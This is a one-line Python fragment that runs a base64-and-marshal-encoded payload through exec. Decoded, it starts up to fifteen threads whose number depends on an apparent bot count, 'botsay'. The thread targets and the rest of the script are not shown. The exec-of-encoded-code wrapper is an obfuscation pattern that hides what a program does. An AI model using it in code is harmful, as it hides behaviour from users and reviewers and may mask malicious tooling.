exec(base64.b64decode(marshal.loads(b'\xc1\x94\x15\x00\x00dDEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kMSkJCnQyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZDIpCnQzPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kMykKdDQ9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWQ0KQp0NT0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZDUpCnQ2PSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kNikKdDc9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWQ3KQp0OD0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZDgpCnQ5PSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kOSkKdDEwPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kMTApCnQxMT0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZDExKQp0MTI9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWQxMikKdDEzPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kMTMpCnQxND0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZDE0KQp0MTU9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWQxNSkKCnQxLnN0YXJ0KCkKCmlmIGJvdHNheT09MiBvciBib3RzYXk9PTMgb3IgYm90c2F5PT00IG9yIGJvdHNheT09NSBvciBib3RzYXk9PTYgb3IgYm90c2F5PT03IG9yIGJvdHNheT09OCBvciBib3RzYXk9PTkgb3IgYm90c2F5PT0xMCBvciBib3RzYXk9PTExIG9yIGJvdHNheT09MTIgb3IgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQyLnN0YXJ0KCkKCQoJCmlmIGJvdHNheT09MyBvciBib3RzYXk9PTQgb3IgYm90c2F5PT01IG9yIGJvdHNheT09NiBvciBib3RzYXk9PTcgb3IgYm90c2F5PT04IG9yIGJvdHNheT09OSBvciBib3RzYXk9PTEwIG9yIGJvdHNheT09MTEgb3IgYm90c2F5PT0xMiBvciBib3RzYXk9PTEzIG9yIGJvdHNheT09MTQgb3IgYm90c2F5PT0xNSBvciBib3RzYXk9PTE2IG9yIGJvdHNheT09MTcgb3IgYm90c2F5PT0xOCBvciBib3RzYXk9PTE5IG9yIGJvdHNheT09MjAgb3IgYm90c2F5PT0yMSBvciBib3RzYXk9PTIyIG9yIGJvdHNheT09MjMgb3IgYm90c2F5PT0yNCBvciBib3RzYXk9PTI1OgoJdDMuc3RhcnQoKQoJCgkKaWYgYm90c2F5PT00IG9yIGJvdHNheT09NSBvciBib3RzYXk9PTYgb3IgYm90c2F5PT03IG9yIGJvdHNheT09OCBvciBib3RzYXk9PTkgb3IgYm90c2F5PT0xMCBvciBib3RzYXk9PTExIG9yIGJvdHNheT09MTIgb3IgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQ0LnN0YXJ0KCkKCQoJCmlmIGJvdHNheT09NSBvciBib3RzYXk9PTYgb3IgYm90c2F5PT03IG9yIGJvdHNheT09OCBvciBib3RzYXk9PTkgb3IgYm90c2F5PT0xMCBvciBib3RzYXk9PTExIG9yIGJvdHNheT09MTIgb3IgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQ1LnN0YXJ0KCkKCQoJCmlmIGJvdHNheT09NiBvciBib3RzYXk9PTcgb3IgYm90c2F5PT04IG9yIGJvdHNheT09OSBvciBib3RzYXk9PTEwIG9yIGJvdHNheT09MTEgb3IgYm90c2F5PT0xMiBvciBib3RzYXk9PTEzIG9yIGJvdHNheT09MTQgb3IgYm90c2F5PT0xNSBvciBib3RzYXk9PTE2IG9yIGJvdHNheT09MTcgb3IgYm90c2F5PT0xOCBvciBib3RzYXk9PTE5IG9yIGJvdHNheT09MjAgb3IgYm90c2F5PT0yMSBvciBib3RzYXk9PTIyIG9yIGJvdHNheT09MjMgb3IgYm90c2F5PT0yNCBvciBib3RzYXk9PTI1OgoJdDYuc3RhcnQoKQoJCgkKaWYgYm90c2F5PT03IG9yIGJvdHNheT09OCBvciBib3RzYXk9PTkgb3IgYm90c2F5PT0xMCBvciBib3RzYXk9PTExIG9yIGJvdHNheT09MTIgb3IgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQ3LnN0YXJ0KCkKCQoJCmlmIGJvdHNheT09OCBvciBib3RzYXk9PTkgb3IgYm90c2F5PT0xMCBvciBib3RzYXk9PTExIG9yIGJvdHNheT09MTIgb3IgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQ4LnN0YXJ0KCkKCQoJCmlmIGJvdHNheT09OSBvciBib3RzYXk9PTEwIG9yIGJvdHNheT09MTEgb3IgYm90c2F5PT0xMiBvciBib3RzYXk9PTEzIG9yIGJvdHNheT09MTQgb3IgYm90c2F5PT0xNSBvciBib3RzYXk9PTE2IG9yIGJvdHNheT09MTcgb3IgYm90c2F5PT0xOCBvciBib3RzYXk9PTE5IG9yIGJvdHNheT09MjAgb3IgYm90c2F5PT0yMSBvciBib3RzYXk9PTIyIG9yIGJvdHNheT09MjMgb3IgYm90c2F5PT0yNCBvciBib3RzYXk9PTI1OgoJdDkuc3RhcnQoKQoJCgkKaWYgYm90c2F5PT0xMCBvciBib3RzYXk9PTExIG9yIGJvdHNheT09MTIgb3IgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQxMC5zdGFydCgpCgkKCQppZiAgYm90c2F5PT0xMSBvciBib3RzYXk9PTEyIG9yIGJvdHNheT09MTMgb3IgYm90c2F5PT0xNCBvciBib3RzYXk9PTE1IG9yIGJvdHNheT09MTYgb3IgYm90c2F5PT0xNyBvciBib3RzYXk9PTE4IG9yIGJvdHNheT09MTkgb3IgYm90c2F5PT0yMCBvciBib3RzYXk9PTIxIG9yIGJvdHNheT09MjIgb3IgYm90c2F5PT0yMyBvciBib3RzYXk9PTI0IG9yIGJvdHNheT09MjU6Cgl0MTEuc3RhcnQoKQoJCgppZiBib3RzYXk9PTEyIG9yIGJvdHNheT09MTMgb3IgYm90c2F5PT0xNCBvciBib3RzYXk9PTE1IG9yIGJvdHNheT09MTYgb3IgYm90c2F5PT0xNyBvciBib3RzYXk9PTE4IG9yIGJvdHNheT09MTkgb3IgYm90c2F5PT0yMCBvciBib3RzYXk9PTIxIG9yIGJvdHNheT09MjIgb3IgYm90c2F5PT0yMyBvciBib3RzYXk9PTI0IG9yIGJvdHNheT09MjU6Cgl0MTIuc3RhcnQoKQoJCgkKaWYgYm90c2F5PT0xMyBvciBib3RzYXk9PTE0IG9yIGJvdHNheT09MTUgb3IgYm90c2F5PT0xNiBvciBib3RzYXk9PTE3IG9yIGJvdHNheT09MTggb3IgYm90c2F5PT0xOSBvciBib3RzYXk9PTIwIG9yIGJvdHNheT09MjEgb3IgYm90c2F5PT0yMiBvciBib3RzYXk9PTIzIG9yIGJvdHNheT09MjQgb3IgYm90c2F5PT0yNToKCXQxMy5zdGFydCgpCgkKCmlmIGJvdHNheT09MTQgb3IgYm90c2F5PT0xNSBvciBib3RzYXk9PTE2IG9yIGJvdHNheT09MTcgb3IgYm90c2F5PT0xOCBvciBib3RzYXk9PTE5IG9yIGJvdHNheT09MjAgb3IgYm90c2F5PT0yMSBvciBib3RzYXk9PTIyIG9yIGJvdHNheT09MjMgb3IgYm90c2F5PT0yNCBvciBib3RzYXk9PTI1OgoJdDE0LnN0YXJ0KCkKCQoKaWYgYm90c2F5PT0xNSBvciBib3RzYXk9PTE2IG9yIGJvdHNheT09MTcgb3IgYm90c2F5PT0xOCBvciBib3RzYXk9PTE5IG9yIGJvdHNheT09MjAgb3IgYm90c2F5PT0yMSBvciBib3RzYXk9PTIyIG9yIGJvdHNheT09MjMgb3IgYm90c2F5PT0yNCBvciBib3RzYXk9PTI1OgoJdDE1LnN0YXJ0KCkKCQoK')))

